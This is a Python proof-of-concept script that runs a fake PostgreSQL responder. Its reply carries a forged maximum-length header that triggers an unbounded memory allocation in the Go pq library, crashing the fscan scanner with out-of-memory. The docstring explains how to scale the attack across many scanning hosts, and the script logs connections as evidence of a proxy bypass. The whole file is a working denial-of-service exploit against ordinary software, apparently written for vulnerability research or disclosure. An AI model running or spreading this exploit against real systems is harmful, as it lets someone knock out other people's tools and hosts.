"""Crafted PG-responder on :5433 replying with an ATTACKER-CONTROLLED length.

Reply = b"H" + 0x7FFFFFFF  (5 bytes total):
  type    = 'H'
  length  = 0x7FFFFFFF -> n = 2147483643 bytes (~2.15 GB), the largest
            positive value a pq message length can hold on this 32-bit ARM
            build (lib/pq conn.go:1030 recvMessage has no upper bound).
  -> make([]byte, 2147483643) with no cap.

Scaling: ModuleThread=5 -> up to 5 concurrent makes = ~10.7 GB demanded by a
5-byte reply; attacker scales with target count (a /24 scan = hundreds of
hosts) -> aggregate demand arbitrarily far past 100 GB. On a 4 GB box the
mmap fails -> Go fatal "out of memory" (or the OOM killer terminates fscan).

Every payload is appended to /home/rasp/bigalloc.payloads as evidence that
the connection arrived DIRECT (no SOCKS5 handshake = proxy bypass).
"""
import socket
import sys
import threading
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5433
HOLD = float(sys.argv[2]) if len(sys.argv) > 2 else 60.0
LOG = "/home/rasp/bigalloc.payloads"

# type 'H' + uint32 max POSITIVE length for a 32-bit build:
#   n = 0x7FFFFFFF - 4 = 2147483643 bytes (~2.15 GB) from a 5-byte reply.
# (0xFFFFFFFF wraps negative on 32-bit int and is rejected cleanly by pq;
#  on 64-bit builds the cap is uint32 -> up to ~4.29 GB per message.)
MAXLEN_REPLY = b"H\x7f\xff\xff\xff"


def handle(c: socket.socket) -> None:
    try:
        c.settimeout(60)
        try:
            data = c.recv(4096)
        except socket.timeout:
            data = b""
        if data:
            with open(LOG, "a") as f:
                f.write(f"{time.strftime('%H:%M:%S')} len={len(data)} hex={data[:32].hex()}\n")
            c.sendall(MAXLEN_REPLY)
            time.sleep(HOLD)
    except Exception:
        pass
    finally:
        try:
            c.close()
        except OSError:
            pass


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("", PORT))
srv.listen(16)
print(f"maxlen PG-responder on *:{PORT} reply={MAXLEN_REPLY.hex()} hold={HOLD}s", flush=True)
while True:
    conn, _ = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
